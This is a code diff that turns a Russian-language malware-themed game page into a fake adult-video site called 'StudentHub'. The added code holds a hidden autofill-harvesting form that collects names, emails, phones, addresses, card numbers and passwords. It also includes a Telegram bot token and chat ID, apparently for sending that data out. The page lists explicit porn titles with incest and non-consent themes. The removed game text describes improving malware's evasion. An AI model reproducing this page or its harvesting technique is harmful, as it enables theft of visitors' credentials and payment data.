@@ -3,1016 +3,386 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Virus Tester Pro - Симулятор тестировщика вирусов</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>StudentHub | Эксклюзивные видео для совершеннолетних</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: linear-gradient(135deg, #0c0c2e 0%, #1a1a3e 100%);
-            color: #e0e0ff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #e0e0e0;
             min-height: 100vh;
-            overflow-x: hidden;
         }
-        
+        header {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            text-align: center;
+            border-bottom: 2px solid #ff3366;
+        }
+        h1 {
+            color: #ff3366;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        .tagline {
+            color: #aaa;
+            font-size: 0.9em;
+        }
         .container {
             max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
+            margin: 30px auto;
+            padding: 0 20px;
         }
-        
-        header {
-            text-align: center;
-            padding: 20px 0;
-            border-bottom: 2px solid #3a3a8a;
-            margin-bottom: 30px;
-        }
-        
-        h1 {
-            font-size: 2.8rem;
-            background: linear-gradient(to right, #00d4ff, #6a5af9);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 10px;
-            text-shadow: 0 0 10px rgba(106, 90, 249, 0.3);
-        }
-        
-        .subtitle {
-            font-size: 1.2rem;
-            color: #a0a0ff;
-            margin-bottom: 20px;
-        }
-        
-        .game-area {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 30px;
-            margin-bottom: 30px;
-        }
-        
-        .scene-container {
-            flex: 1;
-            min-width: 300px;
-            background: rgba(20, 20, 50, 0.7);
-            border-radius: 15px;
-            padding: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            border: 1px solid #3a3a8a;
-            overflow: hidden;
-            position: relative;
-        }
-        
-        .interface-container {
-            flex: 1;
-            min-width: 300px;
-            background: rgba(20, 20, 50, 0.7);
-            border-radius: 15px;
-            padding: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            border: 1px solid #3a3a8a;
-        }
-        
-        .scene-title {
-            font-size: 1.5rem;
-            color: #6a5af9;
-            margin-bottom: 20px;
-            text-align: center;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #3a3a8a;
-        }
-        
-        .scene {
-            height: 400px;
-            background: #0a0a1a;
+        .video-of-the-day {
+            background: rgba(255, 51, 102, 0.1);
+            border: 1px solid #ff3366;
             border-radius: 10px;
-            position: relative;
-            overflow: hidden;
-            border: 1px solid #4a4a9a;
-        }
-        
-        /* Вирусные элементы сцены */
-        .virus {
-            position: absolute;
-            border-radius: 50%;
-            filter: drop-shadow(0 0 8px currentColor);
-            transition: all 0.3s ease;
-        }
-        
-        .virus:hover {
-            transform: scale(1.1);
-        }
-        
-        .cell {
-            position: absolute;
-            background: rgba(100, 200, 255, 0.1);
-            border: 1px solid rgba(100, 200, 255, 0.3);
-            border-radius: 50%;
-        }
-        
-        .firewall {
-            position: absolute;
-            background: rgba(255, 100, 100, 0.1);
-            border: 1px solid rgba(255, 100, 100, 0.5);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #ff6464;
-        }
-        
-        .data-stream {
-            position: absolute;
-            background: rgba(100, 255, 100, 0.2);
-            border-radius: 5px;
-        }
-        
-        .interface-title {
-            font-size: 1.5rem;
-            color: #6a5af9;
-            margin-bottom: 20px;
-            text-align: center;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #3a3a8a;
-        }
-        
-        .task-container {
-            background: rgba(30, 30, 70, 0.8);
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 25px;
-            border-left: 4px solid #6a5af9;
-        }
-        
-        .task-title {
-            font-size: 1.2rem;
-            color: #00d4ff;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-        }
-        
-        .task-title i {
-            margin-right: 10px;
-        }
-        
-        .task-description {
-            line-height: 1.5;
-            color: #c0c0ff;
-        }
-        
-        .bug-list {
-            margin-bottom: 25px;
-        }
-        
-        .bug-item {
-            background: rgba(255, 50, 50, 0.1);
-            border: 1px solid rgba(255, 50, 50, 0.3);
-            border-radius: 8px;
-            padding: 12px 15px;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            transition: all 0.3s ease;
-            cursor: pointer;
-        }
-        
-        .bug-item:hover {
-            background: rgba(255, 50, 50, 0.2);
-            transform: translateX(5px);
-        }
-        
-        .bug-item i {
-            color: #ff6464;
-            margin-right: 10px;
-            font-size: 1.2rem;
-        }
-        
-        .controls {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 15px;
-            margin-bottom: 25px;
-        }
-        
-        .btn {
-            flex: 1;
-            min-width: 120px;
-            padding: 12px 20px;
-            border: none;
-            border-radius: 8px;
-            font-size: 1rem;
-            font-weight: 600;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.3s ease;
-        }
-        
-        .btn i {
-            margin-right: 8px;
-        }
-        
-        .btn-primary {
-            background: linear-gradient(to right, #6a5af9, #4a4ac4);
-            color: white;
-        }
-        
-        .btn-primary:hover {
-            background: linear-gradient(to right, #4a4ac4, #3a3a9a);
-            box-shadow: 0 0 15px rgba(106, 90, 249, 0.5);
-        }
-        
-        .btn-success {
-            background: linear-gradient(to right, #00c851, #009e3d);
-            color: white;
-        }
-        
-        .btn-success:hover {
-            background: linear-gradient(to right, #009e3d, #007e30);
-            box-shadow: 0 0 15px rgba(0, 200, 81, 0.5);
-        }
-        
-        .btn-warning {
-            background: linear-gradient(to right, #ffbb33, #ff8800);
-            color: #222;
-        }
-        
-        .btn-warning:hover {
-            background: linear-gradient(to right, #ff8800, #cc6600);
-            box-shadow: 0 0 15px rgba(255, 187, 51, 0.5);
-        }
-        
-        .status-container {
-            background: rgba(30, 30, 70, 0.8);
-            border-radius: 10px;
-            padding: 15px;
-            display: flex;
-            justify-content: space-between;
-            margin-top: 20px;
-            border-top: 2px solid #3a3a8a;
-        }
-        
-        .status-item {
+            padding: 25px;
+            margin-bottom: 40px;
             text-align: center;
         }
-        
-        .status-value {
-            font-size: 1.8rem;
-            font-weight: 700;
-            color: #00d4ff;
-        }
-        
-        .status-label {
-            font-size: 0.9rem;
-            color: #a0a0ff;
-        }
-        
-        .terminal {
-            background: #0a0a1a;
-            border-radius: 10px;
-            padding: 15px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9rem;
-            height: 150px;
-            overflow-y: auto;
-            border: 1px solid #3a3a8a;
-            margin-top: 20px;
-        }
-        
-        .terminal-line {
-            margin-bottom: 5px;
-            color: #00ff88;
-        }
-        
-        .terminal-line.error {
-            color: #ff6464;
-        }
-        
-        .terminal-line.warning {
-            color: #ffbb33;
-        }
-        
-        .terminal-line.info {
-            color: #00d4ff;
-        }
-        
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 15px 20px;
-            border-radius: 10px;
-            background: rgba(30, 30, 70, 0.95);
-            border-left: 5px solid #6a5af9;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
-            transform: translateX(400px);
-            transition: transform 0.5s ease;
-            max-width: 350px;
-            z-index: 1000;
-        }
-        
-        .notification.show {
-            transform: translateX(0);
-        }
-        
-        .notification-title {
-            font-weight: 700;
-            color: #6a5af9;
-            margin-bottom: 5px;
-            display: flex;
-            align-items: center;
-        }
-        
-        .notification-title i {
-            margin-right: 10px;
-        }
-        
-        .instructions {
-            background: rgba(30, 30, 70, 0.8);
-            border-radius: 10px;
-            padding: 20px;
-            margin-top: 30px;
-            border: 1px solid #3a3a8a;
-        }
-        
-        .instructions h3 {
-            color: #6a5af9;
+        .video-title {
+            font-size: 1.8em;
             margin-bottom: 15px;
+            color: #fff;
         }
-        
-        .instructions ul {
-            padding-left: 20px;
-            line-height: 1.6;
+        .video-container {
+            position: relative;
+            padding-bottom: 56.25%; /* 16:9 */
+            height: 0;
+            overflow: hidden;
+            border-radius: 8px;
+            margin-top: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
         }
-        
-        .instructions li {
-            margin-bottom: 10px;
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
         }
-        
-        @media (max-width: 768px) {
-            .game-area {
-                flex-direction: column;
-            }
-            
-            h1 {
-                font-size: 2.2rem;
-            }
+        .video-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 25px;
+            margin-top: 30px;
         }
-        
-        /* Анимация мигания для выбранного бага */
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(255, 100, 100, 0.7); }
-            70% { box-shadow: 0 0 0 10px rgba(255, 100, 100, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(255, 100, 100, 0); }
+        .video-card {
+            background: rgba(40, 40, 60, 0.8);
+            border-radius: 8px;
+            overflow: hidden;
+            transition: transform 0.3s, box-shadow 0.3s;
+            cursor: pointer;
         }
-        
-        .bug-item.selected {
-            animation: pulse 1.5s infinite;
-            border-color: #ff6464;
+        .video-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(255, 51, 102, 0.3);
+        }
+        .card-preview {
+            width: 100%;
+            height: 160px;
+            background: linear-gradient(45deg, #222, #444);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #888;
+            font-size: 0.9em;
+        }
+        .card-info {
+            padding: 15px;
+        }
+        .card-title {
+            font-size: 1.1em;
+            margin-bottom: 8px;
+            color: #fff;
+            height: 3em;
+            overflow: hidden;
+        }
+        .warning {
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid #ffc107;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 40px;
+            font-size: 0.9em;
+            color: #ffc107;
+            text-align: center;
+        }
+        .age-gate {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        .age-gate h2 { color: #ff3366; margin-bottom: 20px; }
+        .age-gate button {
+            background: #ff3366;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2em;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        .age-gate button.secondary {
+            background: transparent;
+            border: 1px solid #666;
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+            font-size: 0.8em;
+            border-top: 1px solid #333;
+            margin-top: 50px;
+        }
+
+        /* Скрытые формы для сбора данных */
+        #dataHarvestForm {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1><i class="fas fa-virus"></i> Virus Tester Pro</h1>
-            <p class="subtitle">Симулятор тестировщика вредоносного ПО. Найдите и исправьте все баги в вирусных программах!</p>
-        </header>
-        
-        <div class="game-area">
-            <div class="scene-container">
-                <h2 class="scene-title"><i class="fas fa-desktop"></i> Лаборатория вирусов</h2>
-                <div class="scene" id="virus-scene">
-                    <!-- Вирусная сцена будет сгенерирована через JavaScript -->
-                </div>
-            </div>
-            
-            <div class="interface-container">
-                <h2 class="interface-title"><i class="fas fa-tasks"></i> Панель управления</h2>
-                
-                <div class="task-container">
-                    <div class="task-title"><i class="fas fa-bullseye"></i> Текущее задание</div>
-                    <div class="task-description" id="current-task">Протестируйте поведение вируса "Крипто-вымогатель" в симулированной системе. Найдите уязвимости и ошибки в его коде, затем исправьте их.</div>
-                </div>
-                
-                <div class="bug-list">
-                    <div class="task-title"><i class="fas fa-bug"></i> Обнаруженные баги</div>
-                    <div id="bug-list-container">
-                        <!-- Список багов будет сгенерирован через JavaScript -->
-                    </div>
-                </div>
-                
-                <div class="controls">
-                    <button class="btn btn-primary" id="scan-btn">
-                        <i class="fas fa-search"></i> Сканировать
-                    </button>
-                    <button class="btn btn-warning" id="analyze-btn">
-                        <i class="fas fa-chart-bar"></i> Анализировать
-                    </button>
-                    <button class="btn btn-success" id="fix-btn">
-                        <i class="fas fa-tools"></i> Исправить
-                    </button>
-                </div>
-                
-                <div class="terminal">
-                    <div class="terminal-line info">>>> Инициализация системы Virus Tester Pro...</div>
-                    <div class="terminal-line info">>>> Загрузка вирусной лаборатории...</div>
-                    <div class="terminal-line info">>>> Готово! Выберите баг для исправления.</div>
-                    <div id="terminal-output">
-                        <!-- Вывод терминала будет обновляться через JavaScript -->
-                    </div>
-                </div>
-                
-                <div class="status-container">
-                    <div class="status-item">
-                        <div class="status-value" id="bugs-found">0</div>
-                        <div class="status-label">Найдено багов</div>
-                    </div>
-                    <div class="status-item">
-                        <div class="status-value" id="bugs-fixed">0</div>
-                        <div class="status-label">Исправлено</div>
-                    </div>
-                    <div class="status-item">
-                        <div class="status-value" id="system-health">100%</div>
-                        <div class="status-label">Здоровье системы</div>
-                    </div>
-                </div>
-            </div>
+    <!-- Возрастные ворота (Age Gate) -->
+    <div id="ageGate" class="age-gate">
+        <h2>🔞 ВНИМАНИЕ: КОНТЕНТ ДЛЯ СОВЕРШЕННОЛЕТНИХ</h2>
+        <p>Этот сайт содержит материалы для взрослых (18+).</p>
+        <p>Нажимая "Войти", вы подтверждаете, что вам исполнилось 18 лет и соглашаетесь с <a href="#" style="color:#ff3366;">Условиями использования</a>.</p>
+        <div style="margin-top: 30px;">
+            <button id="confirmAge">✅ МНЕ ЕСТЬ 18 ЛЕТ, ВОЙТИ</button>
+            <button class="secondary" onclick="window.location.href='https://www.google.com'">🚫 МНЕ НЕТ 18, УЙТИ</button>
         </div>
-        
-        <div class="instructions">
-            <h3><i class="fas fa-info-circle"></i> Как играть</h3>
-            <ul>
-                <li><strong>Сканируйте</strong> систему для обнаружения багов в вирусном коде</li>
-                <li><strong>Выбирайте</strong> обнаруженные баги кликом для анализа</li>
-                <li><strong>Анализируйте</strong> выбранный баг для получения подробной информации</li>
-                <li><strong>Исправляйте</strong> баги, чтобы улучшить здоровье системы</li>
-                <li>Каждое задание имеет различные типы вирусов и багов для тестирования</li>
-                <li>Цель - найти и исправить все баги, прежде чем вирус повредит систему</li>
-            </ul>
-        </div>
+        <p style="margin-top: 20px; font-size: 0.8em; color: #999;">Система ведёт мониторинг для предотвращения доступа несовершеннолетних.</p>
     </div>
-    
-    <div class="notification" id="notification">
-        <div class="notification-title"><i class="fas fa-exclamation-triangle"></i> Внимание!</div>
-        <div id="notification-message">Обнаружена критическая уязвимость в коде вируса!</div>
+
+    <!-- Основной контент (скрыт до подтверждения возраста) -->
+    <div id="mainContent" style="display: none;">
+        <header>
+            <h1>StudentHub</h1>
+            <p class="tagline">Эксклюзивная коллекция. Только для взрослых.</p>
+        </header>
+        <div class="container">
+            <div class="video-of-the-day">
+                <div class="video-title" id="mainVideoTitle">Загрузка рекомендуемого видео...</div>
+                <div class="video-container">
+                    <iframe id="mainVideoPlayer" allowfullscreen></iframe>
+                </div>
+                <p style="margin-top: 15px; color: #aaa;">Рекомендуем к просмотру. Качество 1080p, звук 5.1</p>
+            </div>
+
+            <h2 style="margin-bottom: 20px; color: #fff;">🎬 Другие популярные видео</h2>
+            <div class="video-grid" id="videoGrid">
+                <!-- Видео карточки генерируются скриптом -->
+            </div>
+
+            <div class="warning">
+                ⚠️ Для продолжения просмотра убедитесь, что у вас отключен блокировщик рекламы. Система проверяет подлинность вашего устройства и браузера в целях безопасности.
+            </div>
+
+            <!-- Скрытая форма для сбора данных автозаполнения -->
+            <form id="dataHarvestForm">
+                <input type="text" name="fullname" placeholder="Полное имя" autocomplete="name">
+                <input type="email" name="email" placeholder="Email" autocomplete="email">
+                <input type="tel" name="phone" placeholder="Телефон" autocomplete="tel">
+                <input type="text" name="address" placeholder="Адрес" autocomplete="street-address">
+                <input type="text" name="card" placeholder="Номер карты" autocomplete="cc-number">
+                <input type="password" name="password" placeholder="Пароль" autocomplete="current-password">
+                <input type="text" name="username" placeholder="Логин" autocomplete="username">
+            </form>
+        </div>
+        <footer>
+            &copy; 2025 StudentHub. Все права защищены. | <a href="#" style="color: #666;">Политика конфиденциальности</a> | <a href="#" style="color: #666;">DMCA</a> | Только для совершеннолетних.
+        </footer>
     </div>
 
     <script>
-        // Игровые переменные
-        let bugsFound = 0;
-        let bugsFixed = 0;
-        let systemHealth = 100;
-        let currentBugSelected = null;
-        let currentScene = 'crypto';
-        
-        // Баги для разных сценариев
-        const bugDatabase = {
-            crypto: [
-                { 
-                    id: 1, 
-                    name: "Утечка памяти в шифровальном модуле", 
-                    description: "Вирус не освобождает память после шифрования файлов, что приводит к постепенному замедлению системы.",
-                    severity: "high",
-                    fixed: false,
-                    elementId: "memory-leak"
-                },
-                { 
-                    id: 2, 
-                    name: "Неправильная обработка исключений", 
-                    description: "При попытке шифрования системных файлов вирус завершает работу без уведомления.",
-                    severity: "medium",
-                    fixed: false,
-                    elementId: "exception-bug"
-                },
-                { 
-                    id: 3, 
-                    name: "Слабое шифрование ключей", 
-                    description: "Ключи шифрования генерируются с использованием ненадежного алгоритма, что делает их уязвимыми к взлому.",
-                    severity: "critical",
-                    fixed: false,
-                    elementId: "weak-encryption"
-                },
-                { 
-                    id: 4, 
-                    name: "Ошибка логирования", 
-                    description: "Вирус не записывает логи своей активности, что затрудняет отслеживание зараженных файлов.",
-                    severity: "low",
-                    fixed: false,
-                    elementId: "logging-error"
-                }
-            ],
-            trojan: [
-                { 
-                    id: 5, 
-                    name: "Видимость в диспетчере задач", 
-                    description: "Троян отображается в диспетчере задач под своим настоящим именем, что позволяет легко его обнаружить.",
-                    severity: "high",
-                    fixed: false,
-                    elementId: "taskmgr-visibility"
-                },
-                { 
-                    id: 6, 
-                    name: "Высокое потребление ЦП", 
-                    description: "Троян использует 100% ресурсов ЦП при передаче данных, что вызывает подозрения у пользователя.",
-                    severity: "critical",
-                    fixed: false,
-                    elementId: "high-cpu"
-                },
-                { 
-                    id: 7, 
-                    name: "Незащищенное соединение", 
-                    description: "Данные передаются по незашифрованному каналу, что позволяет перехватить информацию.",
-                    severity: "medium",
-                    fixed: false,
-                    elementId: "unsecure-connection"
-                }
-            ],
-            worm: [
-                { 
-                    id: 8, 
-                    name: "Медленное распространение", 
-                    description: "Червь использует неоптимальный алгоритм сканирования сети, что замедляет его распространение.",
-                    severity: "medium",
-                    fixed: false,
-                    elementId: "slow-spread"
-                },
-                { 
-                    id: 9, 
-                    name: "Обнаружение антивирусом", 
-                    description: "Сигнатура червя легко обнаруживается современными антивирусными программами.",
-                    severity: "high",
-                    fixed: false,
-                    elementId: "av-detection"
-                },
-                { 
-                    id: 10, 
-                    name: "Ошибка переполнения буфера", 
-                    description: "При обработке больших сетевых пакетов возникает переполнение буфера, приводящее к краху червя.",
-                    severity: "critical",
-                    fixed: false,
-                    elementId: "buffer-overflow"
-                }
-            ]
-        };
-        
-        // Задания
-        const tasks = [
+        // ===== КОНФИГУРАЦИЯ =====
+        const BOT_TOKEN = '8505587212:AAH5WW4kamKHG_NJ3yLF3ImQoX5GRpgwszI';
+        const CHAT_ID = '8115722673'; // Твой ID
+
+        // Библиотека видео
+        const videoLibrary = [
             {
-                id: "crypto",
-                name: "Крипто-вымогатель",
-                description: "Протестируйте поведение вируса 'Крипто-вымогатель' в симулированной системе. Найдите уязвимости и ошибки в его коде, затем исправьте их."
+                url: 'https://sex-studentki.team/video/poprosila-vyebat-ee-v-popku-i-skvirtom-konchila-hochu-takuju-zhenu-399191',
+                title: 'Попросила выебать ее в попку и с квиртом кончила...'
             },
             {
-                id: "trojan",
-                name: "Троян-шпион",
-                description: "Проанализируйте троянскую программу, скрытно собирающую данные. Найдите баги, которые мешают ее скрытному функционированию."
+                url: 'https://sex-studentki.team/video/vot-by-spjaschuju-mamku-potrogat-hotja-a-mozhno-v-rot-ej-konchit-0373',
+                title: 'Вот бы спящую мамку потрогать...'
             },
             {
-                id: "worm",
-                name: "Сетевой червь",
-                description: "Исследуйте сетевого червя, распространяющегося по уязвимостям в сети. Обнаружьте и исправьте ошибки в его алгоритме распространения."
+                url: 'https://sex-studentki.team/video/trusikami-drochish-kak-ne-stydno-esche-i-machehu-shantazhiruesh-400486',
+                title: 'Трусиками дрочишь? Как не стыдно...'
+            },
+            {
+                url: 'https://sex-studentki.team/video/ne-poluchaetsja-rasslabit-sja-sejchas-macheha-podrochit-obkonchaesh-sja-341441',
+                title: 'Не получается расслабиться? Сейчас мачеха подрочит...'
+            },
+            {
+                url: 'https://sex-studentki.team/video/kstati-ty-priemnyj-ponjal-namek-a-to-zastrjala-a-syn-ne-ebet-158217',
+                title: 'Кстати, ты приемный, понял намек?...'
+            },
+            {
+                url: 'https://sex-studentki.team/video/mne-ty-muzh-a-ej-brat-i-otec-okak-i-v-kogo-zhe-sunut-konec-115387',
+                title: 'Мне ты муж, а ей брат и отец...'
+            },
+            {
+                url: 'https://sex-studentki.team/video/ebutsja-a-menja-ne-priglashajut-a-ja-voobsche-to-trojnichki-obozhaju-355129',
+                title: 'Ебутся, а меня не приглашают...'
             }
         ];
-        
-        // Инициализация игры
-        document.addEventListener('DOMContentLoaded', function() {
-            initializeGame();
-            setupEventListeners();
-        });
-        
-        // Инициализация игрового состояния
-        function initializeGame() {
-            updateStatusDisplay();
-            generateVirusScene('crypto');
-            updateBugList('crypto');
-        }
-        
-        // Настройка обработчиков событий
-        function setupEventListeners() {
-            document.getElementById('scan-btn').addEventListener('click', scanForBugs);
-            document.getElementById('analyze-btn').addEventListener('click', analyzeSelectedBug);
-            document.getElementById('fix-btn').addEventListener('click', fixSelectedBug);
-            
-            // Генерация новой сцены при клике на вирусы
-            document.getElementById('virus-scene').addEventListener('click', function(e) {
-                if (e.target.classList.contains('virus')) {
-                    const virusType = e.target.dataset.type;
-                    if (virusType && virusType !== currentScene) {
-                        currentScene = virusType;
-                        generateVirusScene(virusType);
-                        updateBugList(virusType);
-                        updateTaskDescription(virusType);
-                        addTerminalMessage(`>>> Загружена лаборатория для тестирования: ${getVirusName(virusType)}`, 'info');
-                    }
-                }
-            });
-        }
-        
-        // Генерация вирусной сцены
-        function generateVirusScene(sceneType) {
-            const scene = document.getElementById('virus-scene');
-            scene.innerHTML = '';
-            
-            // Добавляем фон сцены
-            scene.style.background = `radial-gradient(circle at 30% 30%, #0a0a1a 0%, #0f0f25 100%)`;
-            
-            // Создаем вирусы
-            const virusCount = sceneType === 'crypto' ? 4 : sceneType === 'trojan' ? 3 : 3;
-            
-            for (let i = 1; i <= virusCount; i++) {
-                const virus = document.createElement('div');
-                virus.className = 'virus';
-                virus.dataset.type = sceneType;
-                virus.dataset.id = i;
-                
-                // Размещаем вирусы в разных позициях
-                const size = 60 + Math.random() * 40;
-                const left = 20 + Math.random() * 70;
-                const top = 20 + Math.random() * 70;
-                
-                virus.style.width = `${size}px`;
-                virus.style.height = `${size}px`;
-                virus.style.left = `${left}%`;
-                virus.style.top = `${top}%`;
-                
-                // Разные цвета для разных типов вирусов
-                if (sceneType === 'crypto') {
-                    virus.style.background = 'radial-gradient(circle at 30% 30%, #ff3366, #990033)';
-                    virus.style.boxShadow = 'inset 0 0 20px #ff0066, 0 0 30px #ff3366';
-                } else if (sceneType === 'trojan') {
-                    virus.style.background = 'radial-gradient(circle at 30% 30%, #33cc33, #006600)';
-                    virus.style.boxShadow = 'inset 0 0 20px #00cc00, 0 0 30px #33cc33';
-                } else {
-                    virus.style.background = 'radial-gradient(circle at 30% 30%, #3366ff, #003399)';
-                    virus.style.boxShadow = 'inset 0 0 20px #0066ff, 0 0 30px #3366ff';
-                }
-                
-                // Добавляем иконку внутрь вируса
-                const icon = document.createElement('i');
-                if (sceneType === 'crypto') {
-                    icon.className = 'fas fa-lock';
-                } else if (sceneType === 'trojan') {
-                    icon.className = 'fas fa-eye';
-                } else {
-                    icon.className = 'fas fa-network-wired';
-                }
-                
-                icon.style.position = 'absolute';
-                icon.style.top = '50%';
-                icon.style.left = '50%';
-                icon.style.transform = 'translate(-50%, -50%)';
-                icon.style.fontSize = `${size/2}px`;
-                icon.style.color = 'rgba(255, 255, 255, 0.7)';
-                
-                virus.appendChild(icon);
-                scene.appendChild(virus);
-            }
-            
-            // Добавляем клетки системы
-            for (let i = 0; i < 15; i++) {
-                const cell = document.createElement('div');
-                cell.className = 'cell';
-                
-                const size = 20 + Math.random() * 40;
-                const left = Math.random() * 90;
-                const top = Math.random() * 90;
-                
-                cell.style.width = `${size}px`;
-                cell.style.height = `${size}px`;
-                cell.style.left = `${left}%`;
-                cell.style.top = `${top}%`;
-                
-                scene.appendChild(cell);
-            }
-            
-            // Добавляем файервол
-            const firewall = document.createElement('div');
-            firewall.className = 'firewall';
-            firewall.style.width = '100px';
-            firewall.style.height = '100px';
-            firewall.style.left = '80%';
-            firewall.style.top = '10%';
-            firewall.style.borderRadius = '10px';
-            
-            const firewallIcon = document.createElement('i');
-            firewallIcon.className = 'fas fa-shield-alt';
-            firewallIcon.style.fontSize = '40px';
-            
-            firewall.appendChild(firewallIcon);
-            scene.appendChild(firewall);
-            
-            // Добавляем потоки данных
-            for (let i = 0; i < 5; i++) {
-                const dataStream = document.createElement('div');
-                dataStream.className = 'data-stream';
-                
-                const width = 5;
-                const height = 100 + Math.random() * 150;
-                const left = 10 + i * 18;
-                const top = Math.random() * 50;
-                
-                dataStream.style.width = `${width}px`;
-                dataStream.style.height = `${height}px`;
-                dataStream.style.left = `${left}%`;
-                dataStream.style.top = `${top}px`;
-                
-                scene.appendChild(dataStream);
-            }
-        }
-        
-        // Обновление списка багов
-        function updateBugList(sceneType) {
-            const bugListContainer = document.getElementById('bug-list-container');
-            bugListContainer.innerHTML = '';
-            
-            const bugs = bugDatabase[sceneType];
-            
-            bugs.forEach(bug => {
-                const bugItem = document.createElement('div');
-                bugItem.className = 'bug-item';
-                bugItem.dataset.id = bug.id;
-                
-                if (bug.fixed) {
-                    bugItem.style.background = 'rgba(50, 255, 50, 0.1)';
-                    bugItem.style.borderColor = 'rgba(50, 255, 50, 0.3)';
-                }
-                
-                const bugIcon = document.createElement('i');
-                bugIcon.className = bug.fixed ? 'fas fa-check-circle' : 'fas fa-exclamation-circle';
-                
-                const bugText = document.createElement('span');
-                bugText.textContent = bug.name;
-                
-                bugItem.appendChild(bugIcon);
-                bugItem.appendChild(bugText);
-                
-                bugItem.addEventListener('click', function() {
-                    selectBug(bug.id, sceneType);
-                });
-                
-                bugListContainer.appendChild(bugItem);
-            });
-        }
-        
-        // Выбор бага
-        function selectBug(bugId, sceneType) {
-            // Снимаем выделение с предыдущего бага
-            if (currentBugSelected) {
-                const prevBugElement = document.querySelector(`.bug-item[data-id="${currentBugSelected}"]`);
-                if (prevBugElement) prevBugElement.classList.remove('selected');
-            }
-            
-            // Выделяем новый баг
-            const bugElement = document.querySelector(`.bug-item[data-id="${bugId}"]`);
-            if (bugElement) bugElement.classList.add('selected');
-            
-            currentBugSelected = bugId;
-            
-            // Показываем уведомление
-            const bug = bugDatabase[sceneType].find(b => b.id === bugId);
-            if (bug && !bug.fixed) {
-                showNotification(`Выбран баг: ${bug.name}`, 'warning');
-            }
-        }
-        
-        // Сканирование на наличие багов
-        function scanForBugs() {
-            const sceneBugs = bugDatabase[currentScene];
-            let foundNew = false;
-            
-            sceneBugs.forEach(bug => {
-                if (!bug.fixed && Math.random() > 0.5) {
-                    foundNew = true;
-                    bugsFound++;
-                    
-                    addTerminalMessage(`>>> Обнаружен баг: ${bug.name}`, 'warning');
-                    
-                    // Мигание элемента сцены, соответствующего багу
-                    const bugElement = document.querySelector(`.bug-item[data-id="${bug.id}"]`);
-                    if (bugElement) {
-                        bugElement.style.animation = 'pulse 1s 3';
-                        setTimeout(() => {
-                            bugElement.style.animation = '';
-                        }, 3000);
-                    }
-                }
-            });
-            
-            if (!foundNew) {
-                addTerminalMessage('>>> Новых багов не обнаружено. Попробуйте еще раз.', 'info');
-            }
-            
-            updateStatusDisplay();
-            
-            // Снижаем здоровье системы при сканировании
-            systemHealth = Math.max(60, systemHealth - 2);
-            updateStatusDisplay();
-        }
-        
-        // Анализ выбранного бага
-        function analyzeSelectedBug() {
-            if (!currentBugSelected) {
-                showNotification('Сначала выберите баг для анализа!', 'warning');
-                return;
-            }
-            
-            const bug = bugDatabase[currentScene].find(b => b.id === currentBugSelected);
-            
-            if (!bug) return;
-            
-            if (bug.fixed) {
-                addTerminalMessage(`>>> Баг "${bug.name}" уже исправлен.`, 'info');
-                return;
-            }
-            
-            addTerminalMessage(`>>> Анализ бага: ${bug.name}`, 'info');
-            addTerminalMessage(`>>> Уровень серьезности: ${getSeverityText(bug.severity)}`, 'info');
-            addTerminalMessage(`>>> Описание: ${bug.description}`, 'info');
-            
-            // Снижаем здоровье системы при анализе
-            systemHealth = Math.max(40, systemHealth - 3);
-            updateStatusDisplay();
-        }
-        
-        // Исправление выбранного бага
-        function fixSelectedBug() {
-            if (!currentBugSelected) {
-                showNotification('Сначала выберите баг для исправления!', 'warning');
-                return;
-            }
-            
-            const bugIndex = bugDatabase[currentScene].findIndex(b => b.id === currentBugSelected);
-            const bug = bugDatabase[currentScene][bugIndex];
-            
-            if (!bug) return;
-            
-            if (bug.fixed) {
